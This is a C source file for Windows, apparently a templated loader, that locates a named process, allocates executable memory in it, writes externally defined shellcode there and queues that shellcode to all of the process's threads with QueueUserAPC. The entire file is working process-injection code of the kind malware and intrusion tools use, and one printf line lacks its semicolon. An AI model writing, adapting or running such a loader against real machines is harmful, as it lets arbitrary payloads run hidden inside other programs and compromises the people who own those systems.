#include "Shellcode.h"
/*
Externally defined shellcode variables:

{
    unsigned char shellcode[];
    unsigned int shellcode_size;
}

*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

#define INITIAL_THREAD_CAPACITY 1024

int main( int argc, char * argv[] ) {
    HANDLE snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0 );
    HANDLE rpoc     = NULL;

    PROCESSENTRY32 procEntry  = { sizeof( PROCESSENTRY32 ) };
    THREADENTRY32 threadEntry = { sizeof( THREADENTRY32 ) };

    const wchar_t * pname = L"${ PNAME }";

    int threadCount = 0, cc = INITIAL_THREAD_CAPACITY;

    printf( "[*] Tasked to locate process: %S\n", pname );

    if ( Process32First( snapshot, &procEntry ) ) {
        while ( _wcsicmp( procEntry.szExeFile, pname ) != 0 ) {

            printf( "[*] Skipping process: %S\n", procEntry.szExeFile )

                if ( !Process32Next( snapshot, &procEntry ) ) {
                procEntry.th32ProcessID = 0;
                break;
            }
        }

        if ( procEntry.th32ProcessID != 0 ) {
            printf( "[+] Found process: %S (PID: %d)\n", pname, procEntry.th32ProcessID );
        } else {
            printf( "[-] Failed to find process: %S\n", pname );
            CloseHandle( snapshot );
            return 1;
        }
    }

    rpoc = OpenProcess( PROCESS_ALL_ACCESS, FALSE, procEntry.th32ProcessID );
    if ( rpoc == NULL ) {
        printf( "[-] Failed to open process: %S\n", pname );
        CloseHandle( snapshot );
        return 1;
    }

    LPVOID addr = VirtualAllocEx( rpoc, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

    if ( addr == NULL ) {
        printf( "[-] Failed to allocate memory in process: %S\n", pname );
        CloseHandle( snapshot );
        CloseHandle( rpoc );
        return 1;
    }

    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)addr;

    if ( !WriteProcessMemory( rpoc, addr, shellcode, shellcode_size, NULL ) ) {
        printf( "[-] Failed to write shellcode to process: %S\n", pname );
        CloseHandle( snapshot );
        CloseHandle( rpoc );
        return 1;
    }

    printf( "[+] Shellcode written to process: %S\n", pname );

    DWORD * threadIds = malloc( sizeof( DWORD ) * cc );
    if ( threadIds == NULL ) {
        printf( "[-] Failed to allocate memory for thread IDs\n" );
        CloseHandle( snapshot );
        CloseHandle( rpoc );
        return 1;
    }

    if ( Thread32First( snapshot, &threadEntry ) ) {
        do {
            if ( threadEntry.th32OwnerProcessID == procEntry.th32ProcessID ) {
                if ( threadCount >= cc ) {
                    cc *= 2;
                    DWORD * temp = realloc( threadIds, sizeof( DWORD ) * cc );
                    if ( temp == NULL ) {
                        printf( "[-] Failed to reallocate memory for thread IDs\n" );
                        free( threadIds );
                        CloseHandle( snapshot );
                        CloseHandle( rpoc );
                        return 1;
                    }
                    threadIds = temp;
                }

                threadIds[threadCount++] = threadEntry.th32ThreadID;
            }
        } while ( Thread32Next( snapshot, &threadEntry ) );
    }

    for ( int i = 0; i < threadCount; ++i ) {
        HANDLE threadHandle = OpenThread( THREAD_ALL_ACCESS, TRUE, threadIds[i] );

        if ( threadHandle != NULL ) {
            if ( QueueUserAPC( threadRoutine, threadHandle, NULL ) ) {

                printf( "[+] Queued shellcode to thread: %d\n", threadIds[i] );

            } else {
                continue;
            }
        }
    }

    free( threadIds );

    CloseHandle( snapshot );
    CloseHandle( rpoc );

    return 0;
}
